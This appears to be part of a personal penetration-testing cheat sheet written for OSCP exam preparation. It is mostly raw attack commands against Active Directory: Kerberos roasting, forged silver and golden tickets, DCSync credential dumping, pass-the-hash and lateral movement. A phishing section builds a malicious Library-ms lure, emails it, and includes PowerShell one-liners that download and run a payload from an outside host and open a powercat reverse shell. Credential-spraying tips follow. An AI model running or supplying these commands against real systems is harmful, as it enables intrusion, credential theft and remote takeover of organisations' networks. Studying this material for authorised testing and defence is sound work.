<span class="nx">GetADUsers</span><span class="p">.</span><span class="nx">py</span> <span class="o">-</span><span class="nx">all</span> <span class="o">-</span><span class="nx">dc</span><span class="o">-</span><span class="nx">ip</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">dave</span><span class="p">:</span><span class="nx">password</span>
</code></pre></div></div>

<h3 id="as-rep-roasting">AS-REP Roasting</h3>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">.</span><span class="err">\</span><span class="nc">Rubeus</span><span class="mf">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="o">/</span><span class="n">nowrap</span>

<span class="n">impacket</span><span class="o">-</span><span class="nc">GetNPUsers</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.1.1</span>  <span class="o">-</span><span class="n">request</span> <span class="o">-</span><span class="n">outputfile</span> <span class="n">hashes</span><span class="mf">.</span><span class="n">asreproast</span> <span class="n">corp</span><span class="mf">.</span><span class="n">com</span><span class="o">/</span><span class="n">dave</span>

<span class="n">nxc</span> <span class="n">ldap</span> <span class="mf">192.168.1.1</span> <span class="o">-</span><span class="n">u</span> <span class="s2">"dave"</span>  <span class="o">-</span><span class="n">p</span> <span class="s2">"password"</span> <span class="o">--</span><span class="n">asreproast</span> <span class="n">hash</span>

<span class="n">sudo</span> <span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">18200</span> <span class="n">hashes</span><span class="mf">.</span><span class="n">asreproast</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="mf">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">hashcat</span><span class="o">/</span><span class="n">rules</span><span class="o">/</span><span class="n">best64</span><span class="mf">.</span><span class="n">rule</span> <span class="o">--</span><span class="n">force</span>
</code></pre></div></div>

<h3 id="kerberoasting">Kerberoasting</h3>

<p>service runas normal user</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sudo</span> <span class="nx">impacket</span><span class="o">-</span><span class="nx">GetUserSPNs</span> <span class="o">-</span><span class="nx">request</span> <span class="o">-</span><span class="nx">dc</span><span class="o">-</span><span class="nx">ip</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">corp</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">dave</span>
<span class="nx">sudo</span> <span class="nx">impacket</span><span class="o">-</span><span class="nx">GetUserSPNs</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">bob</span><span class="p">.</span><span class="nx">alice</span> <span class="o">-</span><span class="nx">hashes</span> <span class="p">:</span><span class="nx">e728ecbadfb02f51ce8eed753f3ff3fd</span> <span class="o">-</span><span class="nx">request</span> <span class="o">-</span><span class="nx">dc</span><span class="o">-</span><span class="nx">ip</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">185.140</span> <span class="o">-</span><span class="nx">outputfile</span> <span class="nx">hashes</span><span class="p">.</span><span class="nx">asreproast</span>
<span class="nx">sudo</span> <span class="nx">hashcat</span> <span class="o">-</span><span class="nx">m</span> <span class="mi">13100</span> <span class="nx">hashes</span><span class="p">.</span><span class="nx">kerberoast</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span> <span class="o">--</span><span class="nx">force</span>

<span class="nx">nxc</span> <span class="nx">ldap</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="dl">"</span><span class="s2">dave</span><span class="dl">"</span>  <span class="o">-</span><span class="nx">p</span> <span class="dl">"</span><span class="s2">password</span><span class="dl">"</span> <span class="o">--</span><span class="nx">kerberoasting</span> <span class="nx">hash</span>

<span class="p">.</span><span class="err">\</span><span class="nx">Rubeus</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">kerberoast</span> <span class="o">/</span><span class="nx">outfile</span><span class="p">:</span><span class="nx">hashes</span><span class="p">.</span><span class="nx">kerberoast</span>
</code></pre></div></div>

<h3 id="silver-tickets">Silver Tickets</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//iis_server NTLM =&gt; rc4 </span>
<span class="nx">sekurlsa</span><span class="p">::</span><span class="nx">logonpasswords</span>
<span class="c1">//SID [-4:]</span>
<span class="nx">whoami</span> <span class="o">/</span><span class="nx">user</span>
<span class="nx">klist</span>
<span class="c1">//inject ticket</span>
<span class="nx">kerberos</span><span class="p">::</span><span class="nx">golden</span> <span class="o">/</span><span class="nx">sid</span><span class="p">:</span><span class="nx">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1987370270</span><span class="o">-</span><span class="mi">658905905</span><span class="o">-</span><span class="mi">1781884369</span> <span class="o">/</span><span class="nx">domain</span><span class="p">:</span><span class="nx">corp</span><span class="p">.</span><span class="nx">com</span> <span class="o">/</span><span class="nx">ptt</span> <span class="o">/</span><span class="nx">target</span><span class="p">:</span><span class="nx">web04</span><span class="p">.</span><span class="nx">corp</span><span class="p">.</span><span class="nx">com</span> <span class="o">/</span><span class="nx">service</span><span class="p">:</span><span class="nx">http</span> <span class="o">/</span><span class="nx">rc4</span><span class="p">:</span><span class="mi">4</span><span class="nx">d28cf5252d39971419580a51484ca09</span> <span class="o">/</span><span class="nx">user</span><span class="p">:</span><span class="nx">dave</span>
<span class="nx">iwr</span> <span class="o">-</span><span class="nx">UseDefaultCredentials</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//web04</span>

<span class="nx">Rubeus</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">silver</span> <span class="o">/</span><span class="nx">service</span><span class="p">:</span><span class="nx">MSSQKSvc</span><span class="o">/</span><span class="nx">kerbdc1</span><span class="p">.</span><span class="nx">kerb</span><span class="p">.</span><span class="nx">local</span><span class="p">:</span><span class="mi">1433</span> <span class="o">/</span><span class="nx">rc4</span><span class="p">:</span><span class="mi">4</span><span class="nx">d28cf5252d39971419580a51484ca09</span> <span class="o">/</span><span class="nx">sid</span><span class="p">:</span><span class="nx">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1987370270</span><span class="o">-</span><span class="mi">658905905</span><span class="o">-</span><span class="mi">1781884369</span> <span class="o">/</span><span class="nx">user</span><span class="p">:</span><span class="nx">administrator</span> <span class="o">/</span><span class="nx">domain</span><span class="p">:</span><span class="nx">kerb</span><span class="p">.</span><span class="nx">local</span> <span class="o">/</span><span class="nx">ptt</span>
<span class="nx">sqlcmd</span> <span class="o">-</span><span class="nx">S</span> <span class="nx">kerbdc1</span><span class="p">.</span><span class="nx">kerb</span><span class="p">.</span><span class="nx">local</span>
</code></pre></div></div>

<h3 id="dcsync-attack">DCSync Attack</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">**</span><span class="c1">//domain admin =&gt; dc**</span>
<span class="c1">//get dave's ntlm when current account is domain admin group</span>
<span class="nx">lsadump</span><span class="p">::</span><span class="nx">dcsync</span> <span class="o">/</span><span class="nx">user</span><span class="p">:</span><span class="nx">corp</span><span class="err">\</span><span class="nx">dave</span>
<span class="nx">lsadump</span><span class="p">::</span><span class="nx">dcsync</span> <span class="o">/</span><span class="nx">user</span><span class="p">:</span><span class="nx">corp</span><span class="err">\</span><span class="nx">administrator</span>

<span class="nx">hashcat</span> <span class="o">-</span><span class="nx">m</span> <span class="mi">1000</span> <span class="nx">hashes</span><span class="p">.</span><span class="nx">dcsync</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span> <span class="o">-</span><span class="nx">r</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">hashcat</span><span class="o">/</span><span class="nx">rules</span><span class="o">/</span><span class="nx">best64</span><span class="p">.</span><span class="nx">rule</span> <span class="o">--</span><span class="nx">force</span>

<span class="nx">impacket</span><span class="o">-</span><span class="nx">secretsdump</span> <span class="o">-</span><span class="nx">just</span><span class="o">-</span><span class="nx">dc</span><span class="o">-</span><span class="nx">user</span> <span class="nx">dave</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">bob</span><span class="p">:</span><span class="dl">"</span><span class="s2">password</span><span class="se">\</span><span class="s2">!</span><span class="dl">"</span><span class="p">@</span><span class="nd">192</span><span class="p">.</span><span class="mf">168.1</span><span class="p">.</span><span class="mi">1</span>
</code></pre></div></div>

<h3 id="lateral-movement">Lateral Movement</h3>

<p>Access</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">winrs</span> <span class="o">-</span><span class="nx">r</span><span class="p">:</span><span class="nx">files04</span> <span class="o">-</span><span class="nx">u</span><span class="p">:</span><span class="nx">jen</span> <span class="o">-</span><span class="nx">p</span><span class="p">:</span><span class="nx">Nexus123</span><span class="o">!</span>  <span class="dl">"</span><span class="s2">powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAA...
./PsExec64.exe -i  </span><span class="se">\\</span><span class="s2">FILES04 -u corp</span><span class="se">\</span><span class="s2">jen -p password! cmd
</span></code></pre></div></div>

<p>Overpass the hash</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sekurlsa</span><span class="p">::</span><span class="nx">logonpasswords</span>
<span class="nx">sekurlsa</span><span class="p">::</span><span class="nx">pth</span> <span class="o">/</span><span class="nx">user</span><span class="p">:</span><span class="nx">dave</span> <span class="o">/</span><span class="nx">domain</span><span class="p">:</span><span class="nx">fake</span><span class="p">.</span><span class="nx">com</span> <span class="o">/</span><span class="nx">ntlm</span><span class="p">:</span><span class="mi">369</span><span class="nx">def79d8372408bf6e93364cc93075</span> <span class="o">/</span><span class="nx">run</span><span class="p">:</span><span class="nx">powershell</span>
<span class="nx">klist</span>
<span class="nx">net</span> <span class="nx">use</span> <span class="err">\\</span><span class="nx">file04</span>
<span class="nx">klist</span>
<span class="p">.</span><span class="err">\</span><span class="nx">PsExec</span><span class="p">.</span><span class="nx">exe</span> <span class="err">\\</span><span class="nx">files04</span> <span class="nx">cmd</span>
</code></pre></div></div>

<p>Pass the Ticket</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sekurlsa</span><span class="p">::</span><span class="nx">tickets</span> <span class="o">/</span><span class="k">export</span>
<span class="nx">dir</span> <span class="o">*</span><span class="p">.</span><span class="nx">kirbi</span>
<span class="nx">kerberos</span><span class="p">::</span><span class="nx">ptt</span> <span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">12</span><span class="nx">bd0</span><span class="p">]</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">40810000</span><span class="o">-</span><span class="nx">dave</span><span class="p">@</span><span class="nd">cifs</span><span class="o">-</span><span class="nx">web04</span><span class="p">.</span><span class="nx">kirbi</span>
<span class="nx">klist</span>
<span class="nx">ls</span> <span class="err">\\</span><span class="nx">web04</span><span class="err">\</span><span class="nx">backup</span>
</code></pre></div></div>

<p>DCOM</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$dcom</span><span class="p">.</span><span class="nx">Document</span><span class="p">.</span><span class="nx">ActiveView</span><span class="p">.</span><span class="nx">ExecuteShellCommand</span><span class="p">(</span><span class="dl">"</span><span class="s2">powershell</span><span class="dl">"</span><span class="p">,</span><span class="nx">$null</span><span class="p">,</span><span class="dl">"</span><span class="s2">powershell -nop -w hidden -e JABjAGwAaQBlAG4</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">7</span><span class="dl">"</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="golden-ticket">Golden Ticket</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//mimikatz  - get NTLM of krbtgt and sid</span>
<span class="nx">lsadump</span><span class="p">::</span><span class="nx">lsa</span> <span class="o">/</span><span class="nx">patch</span>
<span class="c1">//clean ticket</span>
<span class="nx">kerberos</span><span class="p">::</span><span class="nx">purge</span>
<span class="nx">kerberos</span><span class="p">::</span><span class="nx">golden</span> <span class="o">/</span><span class="nx">user</span><span class="p">:</span><span class="nx">jen</span> <span class="o">/</span><span class="nx">domain</span><span class="p">:</span><span class="nx">fake</span><span class="p">.</span><span class="nx">com</span> <span class="o">/</span><span class="nx">sid</span><span class="p">:</span><span class="nx">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1987370270</span><span class="o">-</span><span class="mi">658905905</span><span class="o">-</span><span class="mi">1781884369</span> <span class="o">/</span><span class="nx">krbtgt</span><span class="p">:</span><span class="mi">1693</span><span class="nx">c6cefafffc7af11ef34d1c788f47</span> <span class="o">/</span><span class="nx">ptt</span>
<span class="nx">misc</span><span class="p">::</span><span class="nx">cmd</span>
<span class="c1">//access</span>
<span class="nx">PsExec</span><span class="p">.</span><span class="nx">exe</span> <span class="err">\\</span><span class="nx">dc1</span> <span class="nx">cmd</span><span class="p">.</span><span class="nx">exe</span>
</code></pre></div></div>

<h3 id="phishing">Phishing</h3>

<p>search for possible pdf file for email account (exiftool)</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span>
<span class="err">├──</span> <span class="nx">body</span><span class="p">.</span><span class="nx">txt</span>
<span class="err">├──</span> <span class="nx">config</span><span class="p">.</span><span class="nx">Library</span><span class="o">-</span><span class="nx">ms</span>
<span class="err">├──</span> <span class="nx">powercat</span><span class="p">.</span><span class="nx">ps1</span>
<span class="err">└──</span> <span class="nx">webdav</span>
    <span class="err">└──</span> <span class="nx">powershell</span><span class="p">.</span><span class="nx">lnk</span>

<span class="c1">//powershell.link</span>
<span class="nx">powershell</span><span class="p">.</span><span class="nx">exe</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">"</span><span class="s2">iwr -uri &lt;http://192.168.45.208:8888/supershell/compile/download/rs.exe&gt; -Outfile C:</span><span class="se">\\</span><span class="s2">Users</span><span class="se">\\</span><span class="s2">Public</span><span class="se">\\</span><span class="s2">test_6.exe ; C:</span><span class="se">\\</span><span class="s2">Users</span><span class="se">\\</span><span class="s2">Public</span><span class="se">\\</span><span class="s2">test_6.exe</span><span class="dl">"</span>
<span class="nx">powershell</span><span class="p">.</span><span class="nx">exe</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">"</span><span class="s2">IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.219:8001/powercat.ps1'); powercat -c 192.168.45.219 -p 4444 -e powershell</span><span class="dl">"</span>

<span class="c1">//config.Library-ms</span>
<span class="o">&lt;</span><span class="p">?</span><span class="nx">xml</span> <span class="nx">version</span><span class="o">=</span><span class="dl">"</span><span class="s2">1.0</span><span class="dl">"</span> <span class="nx">encoding</span><span class="o">=</span><span class="dl">"</span><span class="s2">UTF-8</span><span class="dl">"</span><span class="p">?</span><span class="o">&gt;</span>
<span class="p">&lt;</span><span class="nt">libraryDescription</span> <span class="na">xmlns</span><span class="p">=</span><span class="s">"&lt;http://schemas.microsoft.com/windows/2009/library&gt;"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">name</span><span class="p">&gt;</span>@windows.storage.dll,-34582<span class="p">&lt;/</span><span class="nt">name</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">version</span><span class="p">&gt;</span>6<span class="p">&lt;/</span><span class="nt">version</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">isLibraryPinned</span><span class="p">&gt;</span>true<span class="p">&lt;/</span><span class="nt">isLibraryPinned</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">iconReference</span><span class="p">&gt;</span>imageres.dll,-1003<span class="p">&lt;/</span><span class="nt">iconReference</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">templateInfo</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">folderType</span><span class="p">&gt;</span><span class="si">{</span><span class="mi">7</span><span class="nx">d49d726</span><span class="o">-</span><span class="mi">3</span><span class="nx">c21</span><span class="o">-</span><span class="mi">4</span><span class="nx">f05</span><span class="o">-</span><span class="mi">99</span><span class="nx">aa</span><span class="o">-</span><span class="nx">fdc2c9474656</span><span class="si">}</span><span class="p">&lt;/</span><span class="nt">folderType</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">templateInfo</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">searchConnectorDescriptionList</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">searchConnectorDescription</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">isDefaultSaveLocation</span><span class="p">&gt;</span>true<span class="p">&lt;/</span><span class="nt">isDefaultSaveLocation</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">isSupported</span><span class="p">&gt;</span>false<span class="p">&lt;/</span><span class="nt">isSupported</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">simpleLocation</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">url</span><span class="p">&gt;&lt;</span><span class="nt">http</span><span class="err">:</span><span class="c1">//192.168.45.208&gt;&lt;/url&gt;</span>
<span class="err">&lt;/</span><span class="na">simpleLocation</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">searchConnectorDescription</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">searchConnectorDescriptionList</span><span class="p">&gt;</span>s
<span class="p">&lt;/</span><span class="nt">libraryDescription</span><span class="p">&gt;</span>

wsgidav --port=80 --host=0.0.0.0 --root=/home/kali/Desktop/tools/phishing/webdav --auth=anonymous

//exploit1:sending phishing email
sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.167.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
Username: 
Password: 

//exploit2:simulating clicking from share
smbclient //192.168.50.195/share -c 'put config.Library-ms'
</code></pre></div></div>

<h1 id="credentials-1">Credentials</h1>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">If</span> <span class="nx">you</span> <span class="nx">find</span> <span class="nx">a</span> <span class="nx">username</span><span class="p">,</span> <span class="k">try</span> <span class="nx">username</span><span class="p">:</span><span class="nx">username</span> <span class="nx">or</span> <span class="nx">password</span><span class="p">:</span><span class="nx">password</span> <span class="nx">eg</span><span class="p">.</span> <span class="nx">admin</span><span class="p">:</span><span class="nx">admin</span> <span class="nx">or</span> <span class="nx">root</span><span class="p">:</span><span class="nx">root</span>
<span class="nx">If</span> <span class="nx">the</span> <span class="nx">first</span> <span class="nx">letter</span> <span class="k">of</span> <span class="nx">username</span> <span class="nx">is</span> <span class="nx">upppercase</span><span class="p">,</span> <span class="k">try</span> <span class="nx">lowercase</span><span class="p">.</span>
<span class="nx">If</span> <span class="nx">the</span> <span class="nx">first</span> <span class="nx">letter</span> <span class="k">of</span> <span class="nx">username</span> <span class="nx">is</span> <span class="nx">lowercase</span><span class="p">,</span> <span class="k">try</span> <span class="nx">uppercase</span><span class="p">.</span>
<span class="nx">If</span> <span class="nx">the</span> <span class="nx">first</span> <span class="nx">letter</span> <span class="k">of</span> <span class="nx">password</span> <span class="nx">is</span> <span class="nx">upppercase</span><span class="p">,</span> <span class="k">try</span> <span class="nx">lowercase</span><span class="p">,</span> <span class="nx">vice</span> <span class="nx">versa</span><span class="p">.</span>
<span class="nx">user</span><span class="p">.</span><span class="nx">txt</span>
<span class="nx">pass</span><span class="p">.</span><span class="nx">txt</span>
<span class="nx">Try</span> <span class="nx">every</span> <span class="nx">possible</span> <span class="nx">username</span> <span class="nx">found</span> <span class="k">in</span> <span class="nx">files</span>
<span class="nx">search</span> <span class="k">default</span> <span class="nx">credentials</span> 
<span class="nx">search</span> <span class="nx">current</span> <span class="nx">user</span> <span class="nx">history</span> 
<span class="nx">password</span> <span class="nx">reuse</span>
<span class="nx">windows</span><span class="p">.</span><span class="nx">old</span> <span class="o">=&gt;</span> <span class="nx">sam</span><span class="o">/</span><span class="nx">system</span>
<span class="nx">spary</span> <span class="nx">credentials</span> <span class="nx">on</span> <span class="nx">all</span> <span class="nx">possible</span> <span class="nx">open</span> <span class="nx">service</span>
<span class="k">for</span> <span class="nx">AD</span><span class="p">:</span> <span class="nx">spray</span> <span class="nx">password</span> <span class="k">as</span> <span class="nx">local</span> <span class="nx">and</span> <span class="nx">domain</span>
<span class="nx">cat</span> <span class="nx">xxx</span><span class="p">.</span><span class="nx">php</span><span class="p">.</span><span class="nx">bak</span>
<span class="nx">commented</span> <span class="nx">lines</span> <span class="k">in</span> <span class="nx">web</span> <span class="nx">applications</span>
<span class="o">-</span> <span class="nx">wordpress</span> <span class="p">:</span> <span class="nx">wp</span><span class="o">-</span><span class="nx">config</span><span class="p">.</span><span class="nx">php</span>
<span class="o">-</span> <span class="nx">Werkzeug</span> <span class="p">:</span> <span class="nx">app</span><span class="p">.</span><span class="nx">py</span>
</code></pre></div></div>

<h1 id="checklist">Checklist</h1>

<h3 id="foothold">Foothold</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">nmap</span> <span class="nx">tcp</span><span class="o">/</span><span class="nx">udp</span>
<span class="nx">url</span> <span class="nx">scan</span>
<span class="nx">ftp</span><span class="o">/</span><span class="nx">smb</span> <span class="nx">anonymouse</span> <span class="nx">login</span>
<span class="nx">login</span> <span class="nx">panel</span> <span class="nx">weak</span> <span class="nx">password</span>
<span class="nx">web</span> <span class="nx">framework</span> <span class="nx">exploit</span>
<span class="k">try</span> <span class="nx">more</span> 
</code></pre></div></div>

<h3 id="privilege-escalation-1">Privilege Escalation</h3>

<p>linux</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sudo</span> <span class="nx">list</span>
<span class="nx">suid</span>
<span class="nx">scheduled</span> <span class="nx">task</span>
<span class="nx">pspy</span>
<span class="nx">linpeas</span>
<span class="nx">linEnum</span>
</code></pre></div></div>

<p>windows</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">impersonate</span>
<span class="nx">local</span> <span class="nx">service</span>
<span class="p">.</span><span class="nx">git</span>
<span class="nx">interesting</span> <span class="nx">directory</span>
<span class="nx">credentials</span> <span class="o">=&gt;</span> <span class="nx">LaZagne</span><span class="o">/</span><span class="nx">sessionGopher</span>
<span class="nx">powerUp</span> <span class="o">=&gt;</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AllChecksbinary</span> <span class="o">=&gt;</span> <span class="nx">replacement</span> <span class="o">/</span> <span class="nx">unquoted</span> <span class="nx">service</span>
<span class="nx">windows</span><span class="p">.</span><span class="nx">old</span>
<span class="nx">winpeas</span>
<span class="nx">bloodhound</span> <span class="err">#</span><span class="nx">AD</span>
</code></pre></div></div>

<h3 id="ad-1">AD</h3>

<p>Post-Exploitation</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">winpeas</span><span class="p">(</span><span class="nx">admin</span><span class="p">)</span>
<span class="nx">mimikatz</span>
<span class="nx">interesting</span> <span class="nx">file</span> <span class="p">(.</span><span class="nx">kdbx</span> <span class="nx">windows</span><span class="p">.</span><span class="nx">old</span> <span class="nx">history</span><span class="p">)</span>
</code></pre></div></div>

<p>Pivot</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ligolo</span><span class="o">-</span><span class="nx">ng</span>
<span class="nx">spray</span> <span class="nx">password</span><span class="o">/</span><span class="nx">hash</span> <span class="nx">to</span> <span class="nx">every</span> <span class="nx">service</span> <span class="k">as</span> <span class="nx">local</span><span class="o">/</span><span class="nx">domain</span>
</code></pre></div></div>

<h1 id="other-stuff">Other stuff</h1>

<hr />

<h2 id="python-versions">Python versions</h2>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">https</span><span class="p">:</span><span class="c1">//www.kali.org/docs/general-use/using-eol-python-versions/</span>
<span class="nx">pyenv</span> <span class="nx">install</span> <span class="mf">2.7</span><span class="p">.</span><span class="mi">1</span>
<span class="nx">pyenv</span> <span class="nb">global</span> <span class="mf">2.7</span><span class="p">.</span><span class="mi">18</span>
<span class="nx">pyenv</span> <span class="nx">versions</span>
<span class="nx">exec</span> <span class="nx">$SHELL</span>
<span class="nx">python</span>
</code></pre></div></div>

<h2 id="exam">Exam</h2>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">post</span> <span class="nx">the</span> <span class="nx">ULR</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">script</span> <span class="nx">you</span> <span class="nx">use</span>
<span class="nx">post</span> <span class="nx">modified</span> <span class="nx">contents</span>
<span class="nx">screenshots</span><span class="p">:</span> <span class="nx">whoami</span><span class="p">;</span> <span class="nx">type</span> <span class="nx">proof</span><span class="p">.</span><span class="nx">txt</span><span class="p">;</span> <span class="nx">ipconfig</span>
<span class="nx">OSCP</span><span class="o">-</span><span class="nx">OS</span><span class="o">-</span><span class="nx">XXXXX</span><span class="o">-</span><span class="nx">Exam</span><span class="o">-</span><span class="nx">Report</span><span class="p">.</span><span class="mi">7</span><span class="nx">z</span>
<span class="nx">OSCP</span><span class="o">-</span><span class="nx">OS</span><span class="o">-</span><span class="nx">XXXXX</span><span class="o">-</span><span class="nx">Exam</span><span class="o">-</span><span class="nx">Report</span><span class="p">.</span><span class="nx">pdf</span>

<span class="nx">whoami</span><span class="p">;</span><span class="nx">type</span> <span class="nx">proof</span><span class="p">.</span><span class="nx">txt</span><span class="p">;</span><span class="nx">hostname</span><span class="p">;</span><span class="nx">ipconfig</span>
<span class="nx">hostname</span> <span class="o">&amp;</span> <span class="nx">whoami</span> <span class="o">&amp;</span> <span class="nx">type</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="err">\</span><span class="nx">Desktop</span><span class="err">\</span><span class="nx">proof</span><span class="p">.</span><span class="nx">txt</span> <span class="o">&amp;</span> <span class="nx">ipconfig</span> <span class="err">#</span><span class="nx">cmd</span>
</code></pre></div></div>

<h2 id="tools">Tools</h2>

<p><a href="https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md">https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe</a></p>

<p><a href="https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md">https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS</a></p>

<p><a href="https://github.com/tdragon6/Supershell/blob/main/README_EN.md">https://github.com/tdragon6/Supershell</a></p>

<p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>

<p><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>

<p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>

<p><a href="https://github.com/nicocha30/ligolo-ng">https://github.com/nicocha30/ligolo-ng</a></p>

<p><a href="https://www.wappalyzer.com/apps/">https://www.wappalyzer.com/apps/</a></p>

<p><a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>

<p><a href="https://www.kali.org/tools/impacket-scripts/">https://www.kali.org/tools/impacket-scripts/</a></p>

<p><a href="https://www.kali.org/tools/impacket/">https://www.kali.org/tools/impacket/</a></p>

<p><a href="https://github.com/Pennyw0rth/NetExec">https://github.com/Pennyw0rth/NetExec</a></p>

<p><a href="https://www.kali.org/tools/gobuster/">https://www.kali.org/tools/gobuster/</a></p>

<p><a href="https://www.kali.org/tools/bloodhound/">https://www.kali.org/tools/bloodhound/</a></p>

<p><a href="https://github.com/epi052/feroxbuster">https://github.com/epi052/feroxbuster</a></p>

<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></p>

<p><a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p>

<p><a href="https://github.com/tldr-pages/tldr">https://github.com/tldr-pages/tldr</a></p>

<p><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></p>

<p><a href="https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0">https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0</a></p>

<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology and Resources</a></p>

<p><a href="https://github.com/payloadbox/sql-injection-payload-list">https://github.com/payloadbox/sql-injection-payload-list</a></p>

<p><a href="https://github.com/Tib3rius/AutoRecon">https://github.com/Tib3rius/AutoRecon</a></p>

